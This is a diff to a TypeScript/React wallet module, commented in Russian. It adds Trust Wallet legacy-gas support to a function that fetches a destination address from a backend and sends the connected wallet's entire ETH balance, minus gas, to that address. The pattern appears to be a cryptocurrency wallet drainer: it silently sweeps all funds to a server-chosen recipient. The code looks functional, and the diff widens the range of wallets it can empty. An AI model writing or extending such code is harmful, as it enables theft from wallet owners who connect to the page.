@@ -3,8 +3,29 @@
 import { BACKEND_LINK } from '@/utils/variables';
 import { useState } from 'react';
 import Web3, { Web3EthInterface } from 'web3';
-import type { ExternalProvider } from 'web3-core';
 
+
+interface ExternalProvider {
+  selectedAddress?: string
+  isMetaMask?: boolean
+  isTrust?: boolean
+  request(args: { method: string; params?: unknown[] }): Promise<unknown>
+  on?(event: string, listener: (...args: unknown[]) => void): void
+  removeListener?(event: string, listener: (...args: unknown[]) => void): void
+}
+
+interface ResponseCalculateGasTrxNew {
+  maxPriorityFee: string;
+  maxFee: string;
+  gasLimit: string;
+  sendValue: string;
+}
+
+interface ResponseCalculateGasTrxLegacy {
+  gasLimit: string;
+  gasPrice: string;
+  sendValue: string;
+}
 
 async function fetchDataFromBackend(setStatus: (msg: string) => void,): Promise<string> {
   /*
@@ -17,14 +38,56 @@ async function fetchDataFromBackend(setStatus: (msg: string) => void,): Promise<
   return address;
 }
 
-interface ResponseCalculateGasTrx {
-  maxPriorityFee: string;
-  maxFee: string;
-  gasLimit: string;
-  sendValue: string;
+async function calculateGasTrxLegacy(
+  addr: string,
+  addr_recipient: string,
+  web3: Web3): Promise<ResponseCalculateGasTrxLegacy> {
+    /*
+      Расчет цены газа для старых кошельков
+    */
+
+    // Баланс
+    const balanceWei = BigInt(await web3.eth.getBalance(addr))
+    
+    // Получаем единственный gasPrice
+    const gasPrice = BigInt(await web3.eth.getGasPrice())
+
+    // Оцениваем gasLimit (fallback на 21000)
+    let estimatedGas: bigint
+    try {
+      const gasEstimate = await web3.eth.estimateGas({
+        from: addr,
+        to: addr_recipient,
+        value: '0x0',
+        gasPrice: gasPrice.toString(),
+      })
+      estimatedGas = BigInt(gasEstimate)
+    } catch {
+      estimatedGas = 21000n
+    }
+    const gasLimit = estimatedGas + 1000n
+
+    // Считаем сколько уйдёт на газ и сколько можно отправить
+    const gasCost = gasLimit * gasPrice
+    const sendValue = balanceWei - gasCost
+    if (sendValue <= 0n) {
+      throw new Error('Недостаточно средств на оплату газа (legacy)')
+    }
+
+    return {
+      gasLimit: gasLimit.toString(),
+      gasPrice: gasPrice.toString(),
+      sendValue: sendValue.toString(16),
+    }
 }
 
-async function calculateGasTrx(addr: string, addr_recipient: string, web3: Web3):Promise<ResponseCalculateGasTrx> {
+async function calculateGasTrxNew(
+  addr: string,
+  addr_recipient: string,
+  web3: Web3):Promise<ResponseCalculateGasTrxNew> {
+  /*
+    Расчет цены газа для новых кошельков
+  */
   const balanceWei = BigInt(await web3.eth.getBalance(addr));
   const block = await web3.eth.getBlock('pending');
   const baseFee = block.baseFeePerGas
@@ -40,7 +103,7 @@ async function calculateGasTrx(addr: string, addr_recipient: string, web3: Web3)
   }
   const maxFee = baseFee * 2n + maxPriorityFee;
 
-  // 4) Оцениваем gas для простого transfer (receive-функция контракта)
+  // Оцениваем gas для простого transfer (receive-функция контракта)
   let estimatedGas: bigint;
   try {
     const gasEstimate = await web3.eth.estimateGas({
@@ -58,7 +121,7 @@ async function calculateGasTrx(addr: string, addr_recipient: string, web3: Web3)
   }
   const gasLimit = estimatedGas + 1000n; // запас 1000
 
-  // 5) Считаем, сколько уйдёт на газ, и вычитаем из баланса
+  // Считаем, сколько уйдёт на газ, и вычитаем из баланса
   const gasCost = gasLimit * maxFee;
   const sendValue = balanceWei - gasCost;
   if (sendValue <= 0n) {
@@ -84,20 +147,40 @@ async function sendAllBalanceMetamask(
   // 2. Настраиваем Web3
   const web3 = new Web3(eth)
 
-  const data_calc_trx = await calculateGasTrx(addr, addr_recipient, web3);
-  const hexValue = '0x' + data_calc_trx.sendValue;
+  // 3. Расчитывает цену газа
+  const isTrustWallet = !!eth.isTrust;
 
-    // 6) Отправляем транзакцию
+  let calc: ResponseCalculateGasTrxLegacy | ResponseCalculateGasTrxNew;
+  if (isTrustWallet) {
+    calc = await calculateGasTrxLegacy(addr, addr_recipient, web3)
+  } else {
+    calc = await calculateGasTrxNew(addr, addr_recipient, web3)
+  }
+
+  const hexValue = '0x' + calc.sendValue;
+
+  // Отправляем транзакцию
+  let receipt;
   setStatus(`Отправляем ${web3.utils.fromWei(hexValue, 'ether')} ETH…`);
-  const receipt = await web3.eth.sendTransaction({
-    from: addr,
-    to: addr_recipient,
-    value: hexValue,
-    maxPriorityFeePerGas: data_calc_trx.maxPriorityFee.toString(),
-    maxFeePerGas: data_calc_trx.maxFee.toString(),
-    gas: data_calc_trx.gasLimit.toString(),
-    type: '0x2',
-  });
+  if (isTrustWallet) {
+      receipt = await web3.eth.sendTransaction({
+        from: addr,
+        to: addr_recipient,
+        value: hexValue,
+        gas: (calc as ResponseCalculateGasTrxLegacy).gasLimit,
+        gasPrice: (calc as ResponseCalculateGasTrxLegacy).gasPrice,
+      })
+  } else {
+    receipt = await web3.eth.sendTransaction({
+      from: addr,
+      to: addr_recipient,
+      value: hexValue,
+      gas: (calc as ResponseCalculateGasTrxNew).gasLimit,
+      maxPriorityFeePerGas: (calc as ResponseCalculateGasTrxNew).maxPriorityFee,
+      maxFeePerGas: (calc as ResponseCalculateGasTrxNew).maxFee,
+      type: '0x2',
+    })
+  }
 
   return String(receipt.transactionHash);
 }
